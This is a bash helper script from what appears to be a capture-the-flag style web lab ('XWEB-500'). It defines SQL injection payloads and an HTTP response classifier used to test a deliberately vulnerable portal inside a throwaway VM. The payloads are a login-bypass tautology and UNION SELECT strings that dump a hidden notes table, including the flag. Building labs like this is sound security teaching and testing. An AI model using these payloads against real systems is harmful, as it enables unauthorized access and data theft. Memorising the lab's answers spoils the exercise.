#!/bin/bash
# XWEB-500 lab — shared HTTP outcome classifier and payload definitions.
#
# Sourced by inner.sh (inside the throwaway vmtest VM) and by selftest.sh
# (unprivileged, on the host). It defines the FAIL-CLOSED rule of the lab:
#
#   a check may only PASS on a genuine, classified HTTP outcome from the
#   portal; a transport failure (connection refused / timeout / protocol
#   error) or an unclassifiable response is INCONCLUSIVE and is always a
#   failure, never a pass.
#
# The payloads live here too so selftest.sh and inner.sh exercise byte
# identical attack strings against the portal.

# --- payload set (single source of truth) ------------------------------------
# Authentication bypass: the classic quoted-username tautology.
xweb_bypass_username() { printf "%s" "admin' OR 1=1-- "; }
# Any password is fine after the comment; keep a deliberately wrong one so a
# pass can never come from the credentials themselves.
xweb_bypass_password() { printf '%s' 'not-the-code'; }

# UNION dump through the login form (2 columns: id, username). The matched
# row's second column becomes the session identity, so the dashboard greets
# the attacker with the dumped service-note body. The flag note is inserted
# last at every boot, so MAX(note_id) targets it deterministically.
xweb_union_login_username() {
  printf "%s" "x' UNION SELECT 99, body FROM service_notes WHERE note_id = (SELECT MAX(note_id) FROM service_notes)-- "
}

# UNION dump through the public diagnostics archive filter (3 columns:
# ts, label, detail). Renders the service-note rows into the visible table.
xweb_union_archive_probe() { printf "%s" "x' UNION SELECT created, title, body FROM service_notes-- "; }

# Deliberately wrong column count: a genuine SQL fault on the vulnerable
# build (proving the injected SQL executes) and a plain no-match on the
# parameterized control.
xweb_badcol_archive_probe() { printf "%s" "x' UNION SELECT created FROM service_notes-- "; }

# --- classifier ---------------------------------------------------------------
# classify_xweb <curl-rc> <http-code> <body>
#   prints one of:
#     INCONCLUSIVE   transport/protocol failure or empty response
#     DENIED         themed access-denied page (genuine negative)
#     SQLERROR       themed firmware SQL fault page (genuine negative)
#     LOGIN          themed login page
#     DASHBOARD      themed dashboard page
#     SERVICE        themed service-notes page
#     ARCHIVE        themed archive page with rows
#     ARCHIVE_EMPTY  themed archive page, no rows (genuine negative)
#     MAINTENANCE    the hidden themed maintenance page
#     NOTFOUND       themed 404
#     REDIRECT       3xx
#     OTHER          any other complete HTTP answer (genuine, unclassified)
classify_xweb() {
  local rc=$1 code=$2 body=$3
  if [ "$rc" -ne 0 ] || [ -z "$code" ] || [ "$code" = 000 ]; then
    printf 'INCONCLUSIVE\n'
    return 0
  fi
  case "$code" in
    30* | 31*) printf 'REDIRECT\n'; return 0 ;;
  esac
  if printf '%s' "$body" | grep -q 'id="xweb-denied"'; then
    printf 'DENIED\n'; return 0
  fi
  if printf '%s' "$body" | grep -q 'id="xweb-sqlerror"'; then
    printf 'SQLERROR\n'; return 0
  fi
  if printf '%s' "$body" | grep -q 'id="xweb-empty"'; then
    printf 'ARCHIVE_EMPTY\n'; return 0
  fi
  if printf '%s' "$body" | grep -q 'id="xweb-service"'; then
    printf 'SERVICE\n'; return 0
  fi
  if printf '%s' "$body" | grep -q 'id="xweb-dashboard"'; then
    printf 'DASHBOARD\n'; return 0
  fi
  if printf '%s' "$body" | grep -q 'id="xweb-archive"'; then
    printf 'ARCHIVE\n'; return 0
  fi
  if printf '%s' "$body" | grep -q 'id="xweb-maintenance"'; then
    printf 'MAINTENANCE\n'; return 0
  fi
  if printf '%s' "$body" | grep -q 'id="xweb-login"'; then
    printf 'LOGIN\n'; return 0
  fi
  if printf '%s' "$body" | grep -q 'id="xweb-notfound"'; then
    printf 'NOTFOUND\n'; return 0
  fi
  if [ -n "$body" ]; then
    printf 'OTHER\n'; return 0
  fi
  printf 'INCONCLUSIVE\n'
}

# xweb_kind_is_genuine <kind>: every classified outcome EXCEPT INCONCLUSIVE is
# a genuine answer from the portal.
xweb_kind_is_genuine() {
  [ "$1" != INCONCLUSIVE ]
}
